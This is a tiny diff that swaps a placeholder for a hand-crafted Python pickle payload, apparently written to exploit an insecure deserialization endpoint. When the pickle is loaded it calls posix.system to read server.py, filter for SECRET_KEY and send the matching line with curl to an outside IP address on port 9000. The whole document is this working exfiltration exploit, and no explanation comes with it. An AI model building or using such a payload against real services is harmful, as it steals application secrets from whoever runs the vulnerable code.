@@ -1,1 +1,8 @@
-content-of-your-pickle-file
+cposix
+system
+p0
+(S'cat server.py | grep "SECRET_KEY" | curl -d @- 18.217.216.108:9000'
+p1
+tp2
+Rp3
+.
